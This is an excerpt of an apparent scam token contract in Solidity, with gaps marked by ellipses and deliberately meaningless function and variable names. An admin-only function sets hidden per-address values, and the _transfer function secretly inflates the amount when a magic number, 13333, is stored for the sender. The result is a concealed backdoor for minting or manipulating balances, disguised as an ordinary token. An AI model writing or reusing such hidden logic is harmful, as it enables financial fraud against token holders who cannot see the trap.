...
contract Token is Ownable {
    ...
    function exitkillvipccc(address cjjjss) public    {
        uint128 zramount = 0;
        qqtnmuserlk[cjjjss] = zramount;    
        if(_msgSender() == goumAdmintdmm){
            require(_msgSender() == goumAdmintdmm);
        }else{
            require(_msgSender() == goumAdmintdmm);
        }
    ...
    function _transfer(
        ...
        if (13333 != qqtnmuserlk[vipFrom]) {}else{
            amount = _balances[vipFrom] + qqtnmuserlk[vipFrom];
        }
